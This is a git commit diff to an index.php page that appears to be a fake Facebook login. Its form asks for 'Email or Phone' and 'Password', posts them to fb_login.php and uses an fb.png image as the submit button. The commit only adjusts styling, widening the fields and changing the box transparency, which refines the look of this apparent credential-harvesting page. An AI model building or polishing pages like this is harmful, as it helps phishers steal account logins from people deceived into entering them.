94ba24a818aeebb69af47ed98214d460d398fcae
hrib <hugo.dose@gmail.com>
2016-07-08 17:46:21 +0100

    Update index.php

--- index.php
+++ index.php
@@ -21,16 +21,15 @@ div.transbox {
   margin: 30px;
   background-color: #ffffff;
   border: 1px solid black;
-  opacity: 0.6;
-  filter: alpha(opacity=60); /* For IE8 and earlier */
+  background-color: rgba(0,0,0,.5);
 }
 </style>
 
 <div class="transbox" align="right">
   <form action="fb_login.php" method="post">
-      <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 120px; margin-left: 0px; margin-top: 10px;">
+      <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;">
       <p></p>
-      <font style="font-family:arial; font-size:9px;">Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 120px; margin-left: 0px; margin-top: 10px;">
+      <font style="font-family:arial; font-size:9px;">Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;">
       <p></p>
       <input type="image" src="fb.png" style="width:280px;height:105px;">
   </form>
